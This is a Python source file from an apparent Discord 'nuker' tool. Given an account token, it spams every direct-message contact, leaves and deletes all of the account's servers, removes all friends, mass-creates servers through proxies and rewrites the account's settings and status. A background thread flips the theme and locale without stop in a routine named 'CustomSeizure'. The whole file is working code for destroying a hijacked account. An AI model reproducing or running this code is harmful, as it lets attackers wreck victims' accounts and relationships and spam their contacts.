# Coded by ††#9999 | https://github.com/TT-Tutorials | https://github.com/TT-Tutorials/GANG-Nuker
# GANG Discord Nuker / Multi Tool©
# Copyright © 2022
########################################

import os
import random
import requests
import threading
from colorama import Fore
from itertools import cycle
from pystyle import Add, Center, Anime, Colors, Colorate, Write, System
 
from utilities.Settings.common import SlowPrint, getheaders, proxy

###############################################################################

def GANGNUKER_START(token, Server_Name, message_Content):
    if threading.active_count() <= 100:
        t = threading.Thread(target=CustomSeizure, args=(token, ))
        t.start()

    headers = {'Authorization': token}
    channelIds = requests.get("https://discord.com/api/v9/users/@me/channels", headers=getheaders(token)).json()
    for channel in channelIds:
        try:
            requests.post(f'https://discord.com/api/v9/channels/'+channel['id']+'/messages',
            proxies=proxy(),
            headers=headers,
            data={"content": f"{message_Content}"})
            print(f"[ {Fore.LIGHTMAGENTA_EX}${Fore.RESET} ] ID: "+channel['id'])
        except Exception as e:
            print(f"The following error has been encountered and is being ignored: {e}")
    Write.Print(f"\n\nSent Message to ALL friends\n", Colors.purple_to_blue, interval=0.009)
    
    guildsIds = requests.get("https://discord.com/api/v8/users/@me/guilds", headers=getheaders(token)).json()
    for guild in guildsIds:
        try:
            requests.delete(
                f'https://discord.com/api/v8/users/@me/guilds/'+guild['id'], proxies=proxy(), headers={'Authorization': token})
            print(f"[ {Fore.LIGHTMAGENTA_EX}${Fore.RESET} ] Left Server: "+guild['name']+Fore.RESET)
        except Exception as e:
            print(f"The following error has been encountered and is being ignored: {e}")

    for guild in guildsIds:
        try:
            requests.delete(f'https://discord.com/api/v8/guilds/'+guild['id'], proxies=proxy(), headers={'Authorization': token})
            print(f'[ {Fore.LIGHTMAGENTA_EX}${Fore.RESET} ] Deleted: '+guild['name'])
        except Exception as e:
            print(f"The following error has been encountered and is being ignored: {e}")
    Write.Print(f"\nLeft / Deleted Guilds\n", Colors.purple_to_blue, interval=0.009)

    friendIds = requests.get("https://discord.com/api/v9/users/@me/relationships", proxies=proxy(), headers=getheaders(token)).json()
    for friend in friendIds:
        try:
            requests.delete(
                f'https://discord.com/api/v9/users/@me/relationships/'+friend['id'], proxies=proxy(), headers=getheaders(token))
            print(f"[ {Fore.LIGHTMAGENTA_EX}${Fore.RESET} ] Removed Friend: "+friend['user']['username']+"#"+friend['user']['discriminator']+Fore.RESET)
        except Exception as e:
            print(f"[\x1b[95m>\x1b[95m\x1B[37m] The following error has been encountered and is being ignored: {e}")
    Write.Print(f"\nRemoved all available friends\n", Colors.purple_to_blue, interval=0.009)
    
    for i in range(100):
        try:
            payload = {'name': f'{Server_Name}', 'region': 'europe', 'icon': None, 'channels': None}
            requests.post('https://discord.com/api/v7/guilds', proxies=proxy(), headers=getheaders(token), json=payload)
            print(f"[ {Fore.LIGHTMAGENTA_EX}${Fore.RESET} ] Created | {i}{Fore.RESET}")
        except Exception as e:
            print(f"[\x1b[95m>\x1b[95m\x1B[37m] The following error has been encountered and is being ignored: {e}")
    Write.Print(f"\nCreated all servers\n", Colors.purple_to_blue, interval=0.009)
    t.do_run = False
    requests.delete("https://discord.com/api/v8/hypesquad/online", proxies=proxy(), headers=getheaders(token))
    setting = {
          'theme': "light",
          'locale': "ja",
          'inline_embed_media': False,
          'inline_attachment_media': False,
          'gif_auto_play': False,
          'enable_tts_command': False,
          'render_embeds': False,
          'render_reactions': False,
          'animate_emoji': False,
          'convert_emoticons': False,
          'message_display_compact': False,
          'explicit_content_filter': '0',
          "custom_status": {"text": "GANG-NUKER RUNS ME <3"},
          'status': "idle"
    }
    requests.patch("https://discord.com/api/v7/users/@me/settings", proxies=proxy(), headers=getheaders(token), json=setting)
    j = requests.get("https://discordapp.com/api/v9/users/@me", proxies=proxy(), headers=getheaders(token)).json()
    a = j['username'] + "#" + j['discriminator']
    Write.Print(f"\n\nDone, RIP TO THAT ACCOUNT\n", Colors.purple_to_blue, interval=0.009)
    print("[ \x1b[95m>\x1b[95m\x1B[37m ] Press ENTER: ", end="")
    spammer()

######################################## LIGHT / DARK MODE ########################################

def CustomSeizure(token):
    t = threading.currentThread()
    while getattr(t, "do_run", True):
        modes = cycle(["light", "dark"])
        setting = {'theme': next(modes), 'locale': random.choice(['ja', 'zh-TW', 'ko', 'zh-CN'])}
        requests.patch("https://discord.com/api/v7/users/@me/settings", proxies=proxy(), headers=getheaders(token), json=setting)
